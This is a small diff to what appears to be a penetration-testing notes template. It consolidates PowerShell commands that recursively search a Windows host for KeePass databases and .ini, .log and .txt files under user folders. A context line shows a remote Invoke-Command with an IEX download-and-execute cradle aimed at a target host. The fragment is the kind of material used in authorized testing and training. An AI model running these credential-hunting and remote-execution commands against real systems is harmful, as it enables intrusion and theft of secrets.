@@ -136,8 +136,7 @@ Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Ob
 
 # Search For Important Files
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\ -Include *.ini,*.log -File -Recurse
-Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse
+Get-ChildItem -Path C:\Users\ -Include *.ini,*.log,*.txt -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 
